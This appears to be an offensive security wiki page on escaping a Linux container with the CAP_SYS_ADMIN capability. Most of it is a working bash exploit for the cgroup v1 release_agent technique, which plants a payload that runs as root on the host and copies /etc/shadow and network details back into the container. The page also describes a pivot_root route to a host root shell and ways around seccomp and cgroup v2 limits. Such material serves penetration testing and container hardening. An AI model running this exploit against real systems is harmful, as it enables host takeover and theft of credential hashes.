---
title: "CAP_SYS_ADMIN: mounts and the release_agent escape from one capability"
order: 1
description: "CAP_SYS_ADMIN is the broadest Linux capability and is enough to escape a container on its own: it unlocks the mount syscall, so an attacker can mount the cgroup v1 filesystem and abuse notify_on_release plus release_agent to run a program as root in the host, or pivot_root and mount host paths directly."
keywords:
  - cap_sys_admin
  - mount syscall
  - release_agent
  - cgroup escape
  - container escape
---

# CAP_SYS_ADMIN

`CAP_SYS_ADMIN` is often called the new root: the kernel gates roughly forty distinct operations behind it, and the most useful one for escaping a container is `mount(2)`. With the ability to mount filesystems inside the container's mount namespace, an attacker reaches the cgroup v1 `release_agent` mechanism, which the kernel executes as root in the host's namespaces. This is why adding this single capability, even without `--privileged`, is usually a full compromise.

Confirm the capability and that mounting works:

```bash
capsh --print | grep -o cap_sys_admin
grep CapEff /proc/self/status        # bit 21 set
```

## Route: cgroup v1 release_agent

`release_agent` is a path the kernel invokes, as a fresh root process on the host, when the last process leaves a cgroup that has `notify_on_release` set. `CAP_SYS_ADMIN` lets the container mount a fresh cgroup v1 hierarchy and write both files:

```bash
# 1. Mount a cgroup v1 controller we can create groups under
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x

# 2. Turn on release notification for the child group
echo 1 > /tmp/cg/x/notify_on_release

# 3. release_agent runs in the HOST filesystem view, so the payload path
#    must be resolvable there. Recover this container's rootfs on the host:
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host_path/payload" > /tmp/cg/release_agent

# 4. Drop the payload at that host-visible path
cat > /payload <<SH
#!/bin/sh
ip a > $host_path/net.txt 2>&1
cat /etc/shadow > $host_path/shadow.txt 2>&1
SH
chmod +x /payload

# 5. Trigger: a process that enters then exits the child cgroup empties it
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
sleep 1 && cat /net.txt /shadow.txt
```

The subtlety in step 3 is that the kernel runs `release_agent` from the host's root filesystem, not the container's, so writing `/payload` inside the container is useless unless you point `release_agent` at the overlay `upperdir` path where that same file appears on the host. Reading it from `/proc/self/mountinfo` makes the exploit portable across hosts.

## Route: pivot_root and direct host mounts

If a host device is reachable (for example because the container also has device access) `CAP_SYS_ADMIN` lets you mount it and `pivot_root` into it, giving an interactive host root shell without the release_agent dance. This overlaps with [Host block device](../device-access/host-block-device.md).

## Exploitation notes

- The release_agent route needs a cgroup v1 hierarchy. On a cgroup-v2-only host, `mount -t cgroup` has nothing to attach; check `ls /sys/fs/cgroup/release_agent` and `mount | grep cgroup2`. Fall back to a module load or a device mount.
- Some hardened runtimes keep `CAP_SYS_ADMIN` but add a seccomp filter that blocks `mount`; verify with `grep Seccomp /proc/self/status` and test a throwaway `mount -t tmpfs none /mnt`.
- This capability is implied by `--privileged`; see [Privileged flag](../privileged-flag.md) and the standalone [cgroups release_agent](../cgroups-release-agent.md) page for the full handler technique.

## References

- [man 7 capabilities: CAP_SYS_ADMIN](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [man 7 cgroups: notify_on_release and release_agent](https://man7.org/linux/man-pages/man7/cgroups.7.html)
